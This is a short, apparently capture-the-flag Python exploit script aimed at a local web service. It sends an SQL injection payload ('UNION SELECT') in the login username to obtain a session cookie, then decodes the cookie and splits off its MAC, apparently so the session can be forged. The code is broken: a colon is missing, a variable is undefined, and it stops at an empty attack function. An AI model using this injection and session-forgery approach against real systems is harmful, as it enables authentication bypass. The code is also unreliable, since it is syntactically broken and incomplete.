import requests
import base64


def xor(a, b):
    return "".join([chr(ord(a[i]) ^ ord(b[i % len(b)])) for i in xrange(len(a))])

def fetch_jsession(uname,password)
    url = "http://localhost:10080"
    username = "'UNION SELECT '{}','{}".format(uname,password)
    payload = {"username":username, "password": ""}
    r = requests.post(url, data=payload)

    jsession = r.headers['set-cookie'].split('=')[1].replace("%3D","=")

    jsession = base64.b64decode(jsession)
    session = jsession[:-16]
    mac = u[-16:]
    return session,mac

def attack(c,p):
    